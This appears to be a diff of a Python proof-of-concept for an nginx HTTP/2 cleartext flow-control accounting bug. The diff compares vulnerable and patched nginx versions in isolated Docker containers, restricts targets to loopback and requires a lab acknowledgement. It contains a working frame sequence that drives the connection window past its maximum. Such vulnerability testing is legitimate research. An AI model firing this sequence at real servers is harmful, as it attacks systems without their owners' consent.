@@ -7,7 +7,6 @@ Run the isolated Docker differential with Python 3.10+:
       --acknowledge-local-lab I-AUTHORIZE-LOCAL-LAB
 
 This is an accounting test, not an RCE exploit. TLS support is unvalidated.
-Figure: ../social/h2c-flow-control-blog-figure.png
 
 Protocol sequence:
 
@@ -17,32 +16,35 @@ Ordering (derived from source analysis of v1.31.8):
     of responses (all flushed; client reads).
  2. Raise the connection window to MAX: WINDOW_UPDATE(0, MAX)  [accepted,
     send_window = MAX]
- 3. Request a 8 MB static file (stream 157) and grant 8 MB of per-stream
-    credit WITHOUT reading.  send_chain queues 16 KB DATA frames while
+ 3. Request an 8 MB static file (stream 157) and grant 8 MB of per-stream
+    credit WITHOUT reading.  send_chain queues DATA frames while
     connection credit remains, flushing into the TCP send buffer until it
-    fills; the remaining ~4 MB stays queued in h2c->last_out with
-    h2c->send_window decremented accordingly.  (10000-frame cap = 80 MB of
-    8 KB frames, so queueing is not capped here.)
- 4. Refund event: WINDOW_UPDATE(0, Q) where Q = an upper bound of the
-    queued bytes we estimate, then RST_STREAM(157, CANCEL).  cleanup refunds
-    the *actual* queued amount a second time: send_window = MAX + Q'.
+    fills; an environment-dependent tail stays queued in h2c->last_out with
+    h2c->send_window decremented accordingly.
+ 4. Refund event: WINDOW_UPDATE(0, 4 MiB) probes the queued-byte threshold,
+    then RST_STREAM(157, CANCEL) if the connection remains usable. Cleanup
+    refunds the actual queued amount a second time on vulnerable nginx.
  5. Probe: WINDOW_UPDATE(0, 1).  Accepted => the check underflowed => the
     connection window exceeds MAX => CVE-2026-123007 accounting error
-    CONFIRMED.  Rejected (GOAWAY FLOW_CTRL_ERROR) => refund did not exceed
-    MAX (ordering wrong).
+    CONFIRMED. Rejection may appear as GOAWAY or a TCP close without GOAWAY.
  6. Sync PING: proves the connection is alive with the corrupted window.
 """
 
 from __future__ import annotations
 
 import argparse
+import hashlib
 import ipaddress
+import json
 import socket
 import ssl
 import subprocess
 import time
 import uuid
+from dataclasses import asdict, dataclass, field
+from datetime import datetime, timezone
 from pathlib import Path
+from typing import Sequence
 
 MAX = 0x7FFFFFFF
 PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
@@ -55,6 +57,55 @@ PING = 6
 GOAWAY = 7
 WINDOW_UPDATE = 8
 
+Frame = tuple[int, int, int, bytes]
+
+
+@dataclass(frozen=True)
+class TargetEvidence:
+    """One target's narrow accounting-test result."""
+
+    image: str
+    version: str
+    expected_exit: int
+    actual_exit: int | None = None
+    result: str = "not_run"
+    detail: str = ""
+
+
+@dataclass(frozen=True)
+class RunEvidence:
+    """Reproducible evidence for one bounded isolated differential."""
+
+    schema_version: int = 1
+    cve: str = "CVE-2026-123007"
+    test: str = "compact-h2c-accounting-differential"
+    scope: str = "accounting_only_not_rce"
+    tls_validated: bool = False
+    network: str = "internal_docker_no_published_ports"
+    timeout_seconds: int = 45
+    target_images: tuple[str, ...] = ("nginx:1.31.8", "nginx:1.31.9")
+    script_sha256: str = ""
+    started_at: str = ""
+    targets: tuple[TargetEvidence, ...] = ()
+    cleanup_attempted: bool = False
+    passed: bool = False
+
+
+@dataclass
+class DockerBudget:
+    """Hard per-command and per-client limits for a disposable lab run."""
+
+    command_timeout: int = 45
+    client_timeout: int = 45
+    memory: str = "256m"
+    pids_limit: int = 128
+    output_limit: int = 1024 * 1024
+
+
+class LabError(RuntimeError):
+    """An expected, bounded lab failure with no exploitability implication."""
+
+
 END_STREAM = 1
 ACK = 1
 END_HEADERS = 4
@@ -63,12 +114,24 @@ AUTHORITY = 1
 PATH = 4
 RANGE = 50
 
-NAMES = {0: "DATA", 1: "HEADERS", 3: "RST_STREAM", 4: "SETTINGS",
-         6: "PING", 7: "GOAWAY", 8: "WINDOW_UPDATE"}
+NAMES = {
+    0: "DATA",
+    1: "HEADERS",
+    3: "RST_STREAM",
+    4: "SETTINGS",
+    6: "PING",
+    7: "GOAWAY",
+    8: "WINDOW_UPDATE",
+}
 
 
 def frame(kind: int, flags: int, stream: int, data: bytes = b"") -> bytes:
-    return len(data).to_bytes(3, "big") + bytes((kind, flags)) + stream.to_bytes(4, "big") + data
+    return (
+        len(data).to_bytes(3, "big")
+        + bytes((kind, flags))
+        + stream.to_bytes(4, "big")
+        + data
+    )
 
 
 def decode_frames(buf: bytearray, data: bytes) -> list[tuple[int, int, int, bytes]]:
@@ -81,8 +144,8 @@ def decode_frames(buf: bytearray, data: bytes) -> list[tuple[int, int, int, byte
             break
         kind, flags = buf[3], buf[4]
         stream = int.from_bytes(buf[5:9], "big") & MAX
-        payload = bytes(buf[9:9 + length])
-        del buf[:9 + length]
+        payload = bytes(buf[9 : 9 + length])
+        del buf[: 9 + length]
         out.append((kind, flags, stream, payload))
     return out
 
@@ -127,9 +190,12 @@ def literal(name, value):
 
 
 def request(stream, authority, path="/index.html", extra=b""):
-    return frame(HEADERS, END_STREAM | END_HEADERS, stream,
-                 b"\x82\x87" + literal(AUTHORITY, authority)
-                 + literal(PATH, path) + extra)
+    return frame(
+        HEADERS,
+        END_STREAM | END_HEADERS,
+        stream,
+        b"\x82\x87" + literal(AUTHORITY, authority) + literal(PATH, path) + extra,
+    )
 
 
 def setting(value):
@@ -157,6 +223,23 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
         action="store_true",
         help="Run the isolated h2c Docker differential (conflicts with --tls)",
     )
+    parser.add_argument("--output", type=Path, help="Write structured JSON evidence")
+    parser.add_argument(
+        "--command-timeout",
+        type=int,
+        default=45,
+        choices=range(1, 121),
+        metavar="1..120",
+        help="Maximum seconds per Docker operation",
+    )
+    parser.add_argument(
+        "--client-timeout",
+        type=int,
+        default=45,
+        choices=range(1, 121),
+        metavar="1..120",
+        help="Maximum seconds for each client differential",
+    )
     parser.add_argument(
         "--acknowledge-local-lab",
         required=True,
@@ -166,7 +249,9 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     if args.acknowledge_local_lab != "I-AUTHORIZE-LOCAL-LAB":
         parser.error("explicit local-lab acknowledgement is required")
     if args.docker and args.tls:
-        parser.error("--docker runs h2c only; use run_compact_lab.sh for TLS")
+        parser.error(
+            "--docker runs h2c only; --tls requires a separately supplied lab target"
+        )
     try:
         if not ipaddress.ip_address(args.host).is_loopback:
             raise ValueError
@@ -180,7 +265,9 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
 def main(argv: list[str] | None = None) -> int:
     args = parse_args(argv)
     if args.docker:
-        return docker_differential()
+        return docker_differential(
+            args.output, args.command_timeout, args.client_timeout
+        )
     host, port = args.host, args.port
     address = ipaddress.ip_address(host)
     authority = f"[{host}]:{port}" if address.version == 6 else f"{host}:{port}"
@@ -223,7 +310,7 @@ def main(argv: list[str] | None = None) -> int:
         events.append((kind, flags, stream, payload))
 
     def drain(seconds, tag):
-        raw.settimeout(.25)
+        raw.settimeout(0.25)
         deadline = time.monotonic() + seconds
         closed = False
         while time.monotonic() < deadline:
@@ -246,8 +333,10 @@ def main(argv: list[str] | None = None) -> int:
         send(PREFACE + frame(SETTINGS, 0, 0, b"\0\1\0\0\0\0\0\4\0\0\xff\xff"))
         drain(1, "init")
         send(frame(SETTINGS, ACK, 0))
-        send(b"".join(request(stream, authority) for stream in range(1, 147, 2))
-             + request(147, authority, extra=literal(RANGE, "bytes=0-126")))
+        send(
+            b"".join(request(stream, authority) for stream in range(1, 147, 2))
+            + request(147, authority, extra=literal(RANGE, "bytes=0-126"))
+        )
         closed = drain(2, "fill")
         if closed or any(kind == GOAWAY for kind, _, _, _ in events):
             raise RuntimeError("target did not complete the 65,535-byte fill")
@@ -258,7 +347,10 @@ def main(argv: list[str] | None = None) -> int:
         if closed or any(kind == GOAWAY for kind, _, _, _ in events):
             raise RuntimeError("target rejected the initial connection-window refill")
 
-        print("== stage 3: request big.bin on stream 157, grant 8MB credit, stop reading", flush=True)
+        print(
+            "== stage 3: request big.bin on stream 157, grant 8MB credit, stop reading",
+            flush=True,
+        )
         send(request(157, authority, path="/big.bin"))
         closed = drain(1, "req157") or closed
         if closed or any(kind == GOAWAY for kind, _, _, _ in events):
@@ -273,11 +365,9 @@ def main(argv: list[str] | None = None) -> int:
             time.sleep(1.5)
 
         print("== stage 4: refund event: update(0, 4MB) then RST 157", flush=True)
-        # The queued amount is unknown but <= 8MB granted; the refund equals the
-        # ACTUAL queued bytes.  Any update(0, X) accepted here while window is
-        # MAX-X'... we choose X = 4194304 (4MB): accepted iff X <= MAX - window.
-        # window = MAX - queued, so accepted iff 4MB <= queued.  If rejected, we
-        # know queued < 4MB (and still have the RST refund to test).
+        # With no prior queued bytes, window = MAX - queued, so the update
+        # probes whether at least 4 MiB remains queued. Patched nginx includes
+        # queued bytes in its bound; its server log gives the effective total.
         if not closed:
             send(update(0, 4194304))
             closed = drain(1, "wu4M")
@@ -285,21 +375,31 @@ def main(argv: list[str] | None = None) -> int:
             send(reset(157))
             closed = drain(2, "rst157")
         else:
-            print("The 4 MiB update was rejected; the server log determines the queued-byte bound.", flush=True)
+            print(
+                "The 4 MiB update was rejected; the server log determines the queued-byte bound.",
+                flush=True,
+            )
 
-        print("== stage 5: probe WINDOW_UPDATE(0, 1): accepted => over-credit", flush=True)
+        print(
+            "== stage 5: probe WINDOW_UPDATE(0, 1): accepted => over-credit", flush=True
+        )
         if not closed and not any(kind == GOAWAY for kind, _, _, _ in events):
             send(update(0, 1))
             probe_sent = True
             closed = drain(2, "probe1")
 
         print("== stage 6: sync PING", flush=True)
-        if probe_sent and not closed and not any(kind == GOAWAY for kind, _, _, _ in events):
+        if (
+            probe_sent
+            and not closed
+            and not any(kind == GOAWAY for kind, _, _, _ in events)
+        ):
             send(frame(PING, 0, 0, b"POC-SYNC"))
             closed = drain(3, "ping")
     except (OSError, RuntimeError) as exc:
         print(f"ERROR: local test did not complete: {exc}", flush=True)
         if not probe_sent:
+            print(">>> INCONCLUSIVE: protocol stage did not complete", flush=True)
             return 2
         closed = True
     finally:
@@ -307,12 +407,24 @@ def main(argv: list[str] | None = None) -> int:
 
     positive, summary = summarize_result(events, closed=closed, probe_sent=probe_sent)
     print(f">>> {summary}", flush=True)
-    print("This is an accounting test only; it does not demonstrate code execution.", flush=True)
+    print(
+        "This is an accounting test only; it does not demonstrate code execution.",
+        flush=True,
+    )
     return 0 if positive else 1
 
 
-def docker_differential() -> int:
-    """Run fresh vulnerable and patched targets on a private Docker network."""
+def sha256_file(path: Path) -> str:
+    """Hash one local script or evidence file for reproducibility."""
+    return hashlib.sha256(path.read_bytes()).hexdigest()
+
+
+def docker_differential(
+    output: Path | None = None,
+    command_timeout: int = 45,
+    client_timeout: int = 45,
+) -> int:
+    """Run a bounded, isolated h2c differential and optionally save JSON evidence."""
     label = "io.censys.research.nginx2root-compact"
     run_id = f"selftest-{uuid.uuid4().hex[:12]}"
     network = f"nginx2root-compact-{run_id}"
@@ -325,27 +437,68 @@ def docker_differential() -> int:
         "root /usr/share/nginx/html; "
         "location / { try_files $uri $uri/ =404; } } }"
     )
+    evidence = RunEvidence(
+        timeout_seconds=client_timeout,
+        script_sha256=sha256_file(Path(__file__)),
+        started_at=datetime.now(timezone.utc).isoformat(),
+    )
+    targets: list[TargetEvidence] = []
+    passed = False
+    exit_code = 2
 
-    def docker(*args: str, timeout: int = 45) -> subprocess.CompletedProcess[str]:
+    def docker(
+        *args: str, timeout: int = command_timeout
+    ) -> subprocess.CompletedProcess[str]:
+        """Run one bounded Docker operation without invoking a shell."""
         return subprocess.run(
-            ["docker", *args], check=True, text=True,
-            stdout=subprocess.PIPE, stderr=None, timeout=timeout,
+            ["docker", *args],
+            check=True,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=None,
+            timeout=timeout,
         )
 
     try:
         docker("info")
-        docker("network", "create", "--internal", "--label", f"{label}={run_id}", network)
+        docker(
+            "network", "create", "--internal", "--label", f"{label}={run_id}", network
+        )
         for version, expected in (("1.31.8", 0), ("1.31.9", 1)):
             name = f"nginx2root-compact-{version}-{run_id}"
+            target = TargetEvidence(
+                image=f"nginx:{version}", version=version, expected_exit=expected
+            )
+            targets.append(target)
             docker(
-                "run", "-d", "--name", name,
-                "--platform", "linux/amd64", "--network", network,
-                "--label", f"{label}={run_id}",
-                "--cap-drop", "ALL", "--cap-add", "CHOWN",
-                "--cap-add", "SETGID", "--cap-add", "SETUID",
-                "--security-opt", "no-new-privileges",
-                "--memory", "256m", "--pids-limit", "128",
-                "--entrypoint", "sh", f"nginx:{version}", "-c",
+                "run",
+                "-d",
+                "--name",
+                name,
+                "--platform",
+                "linux/amd64",
+                "--network",
+                network,
+                "--label",
+                f"{label}={run_id}",
+                "--cap-drop",
+                "ALL",
+                "--cap-add",
+                "CHOWN",
+                "--cap-add",
+                "SETGID",
+                "--cap-add",
+                "SETUID",
+                "--security-opt",
+                "no-new-privileges",
+                "--memory",
+                "256m",
+                "--pids-limit",
+                "128",
+                "--entrypoint",
+                "sh",
+                f"nginx:{version}",
+                "-c",
                 "dd if=/dev/zero of=/usr/share/nginx/html/big.bin "
                 "bs=1048576 count=8 status=none && "
                 f"printf '%s' '{config}' > /etc/nginx/nginx.conf && "
@@ -353,53 +506,119 @@ def docker_differential() -> int:
             )
             for _ in range(30):
                 ready = subprocess.run(
-                    ["docker", "exec", name, "sh", "-c",
-                     "nginx -t >/dev/null 2>&1 && grep -a -l "
-                     "'nginx: worker process' /proc/[0-9]*/cmdline >/dev/null 2>&1"],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                    [
+                        "docker",
+                        "exec",
+                        name,
+                        "sh",
+                        "-c",
+                        "nginx -t >/dev/null 2>&1 && grep -a -l "
+                        "'nginx: worker process' /proc/[0-9]*/cmdline >/dev/null 2>&1",
+                    ],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    timeout=command_timeout,
                 )
                 if ready.returncode == 0:
                     break
                 time.sleep(0.2)
             else:
-                print(f"ERROR: nginx {version} did not become ready", flush=True)
-                subprocess.run(["docker", "logs", name], check=False)
-                return 2
+                raise RuntimeError(f"nginx {version} did not become ready")
             result = subprocess.run(
                 [
-                    "docker", "run", "--rm", "--platform", "linux/amd64",
-                    "--network", f"container:{name}",
-                    "--security-opt", "no-new-privileges",
-                    "--memory", "128m", "--pids-limit", "64",
-                    "--entrypoint", "/bin/sh", "-v",
+                    "docker",
+                    "run",
+                    "--rm",
+                    "--platform",
+                    "linux/amd64",
+                    "--network",
+                    f"container:{name}",
+                    "--security-opt",
+                    "no-new-privileges",
+                    "--memory",
+                    "128m",
+                    "--pids-limit",
+                    "64",
+                    "--entrypoint",
+                    "/bin/sh",
+                    "-v",
                     f"{Path(__file__).resolve()}:/src/h2c_flow_control_test.py:ro",
-                    "python:3.10-slim", "-c",
+                    "python:3.10-slim",
+                    "-c",
                     "python -I /src/h2c_flow_control_test.py --host 127.0.0.1 --port 80 "
                     "--acknowledge-local-lab I-AUTHORIZE-LOCAL-LAB",
                 ],
-                timeout=45,
+                timeout=client_timeout,
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+            )
+            targets[-1] = TargetEvidence(
+                image=target.image,
+                version=version,
+                expected_exit=expected,
+                actual_exit=result.returncode,
+                result="passed" if result.returncode == expected else "failed",
+                detail=result.stdout[-4096:],
             )
             if result.returncode != expected:
-                print(f"ERROR: nginx {version} returned {result.returncode}, expected {expected}", flush=True)
+                print(
+                    f"ERROR: nginx {version} returned {result.returncode}, expected {expected}",
+                    flush=True,
+                )
                 return 1
-        print("PASS: vulnerable h2c accepted over-credit; patched control rejected it", flush=True)
+        passed = True
+        exit_code = 0
+        print(
+            "PASS: vulnerable h2c accepted over-credit; patched control rejected it",
+            flush=True,
+        )
         return 0
     except FileNotFoundError:
         print("ERROR: Docker is required for --docker", flush=True)
         return 2
-    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
+    except (
+        subprocess.CalledProcessError,
+        subprocess.TimeoutExpired,
+        RuntimeError,
+    ) as exc:
         print(f"ERROR: isolated differential failed: {exc}", flush=True)
         return 2
     finally:
         owned = subprocess.run(
             ["docker", "ps", "-aq", "--filter", f"label={label}={run_id}"],
-            text=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            timeout=command_timeout,
         )
         for container in owned.stdout.splitlines():
-            subprocess.run(["docker", "rm", "-f", container],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["docker", "network", "rm", network],
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(
+                ["docker", "rm", "-f", container],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=command_timeout,
+            )
+        subprocess.run(
+            ["docker", "network", "rm", network],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=command_timeout,
+        )
+        if output is not None:
+            record = RunEvidence(
+                timeout_seconds=client_timeout,
+                script_sha256=evidence.script_sha256,
+                started_at=evidence.started_at,
+                targets=tuple(targets),
+                cleanup_attempted=True,
+                passed=passed,
+            )
+            output.parent.mkdir(parents=True, exist_ok=True)
+            output.write_text(
+                json.dumps(asdict(record), indent=2) + "\n", encoding="utf-8"
+            )
+            print(f"Wrote evidence: {output}", flush=True)
 
 
 if __name__ == "__main__":
